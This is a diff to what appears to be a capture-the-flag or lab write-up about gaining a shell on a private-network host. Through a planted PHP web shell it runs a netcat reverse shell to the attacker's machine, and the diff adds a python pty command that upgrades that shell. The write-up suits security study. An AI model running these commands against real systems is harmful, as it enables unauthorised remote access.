@@ -65,4 +65,4 @@ Query OK, 1 row affected (0.001 sec)
 
 Then going to the php site, sure enough cmd.php was there. Browsing to it with `192.168.53.6:8080/cmd.php?cmd=ls` ran ls successfully. Time for a reverse netcat shell!
 
-`192.168.53.6:8080/cmd.php?cmd=nc%20192.168.53.4%204444%20-e%20/bin/bash` plus `nc -nvlp 4444` in another prompt got me a reverse nc, then `` got me a nice shell.
+`192.168.53.6:8080/cmd.php?cmd=nc%20192.168.53.4%204444%20-e%20/bin/bash` plus `nc -nvlp 4444` in another prompt got me a reverse nc, then `python -c "import pty;pty.spawn('/bin/bash');"` got me a nice shell.
